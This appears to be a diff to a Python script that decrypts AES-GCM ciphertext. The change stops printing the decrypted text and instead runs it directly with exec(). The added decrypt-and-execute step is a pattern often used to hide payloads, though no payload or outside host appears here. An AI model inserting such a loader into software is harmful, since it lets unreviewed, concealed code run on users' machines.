@@ -41,10 +41,19 @@ try:
     cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
     plaintext = cipher.decrypt_and_verify(ciphertext, tag)
     print("Decrypted successfully!")
-    print("-" * 40)
-    print(plaintext.decode())
-    print("-" * 40)
 except Exception as e:
     print(f"Decryption error: {e}")
     sys.exit(1)
+
+# Execute the decrypted code
+print("-" * 40)
+print("Executing decrypted code:")
+print("-" * 40)
+try:
+    exec(plaintext.decode())
+except Exception as e:
+    print(f"Execution error: {e}")
+    sys.exit(1)
+print("-" * 40)
+print("Execution complete!")
 
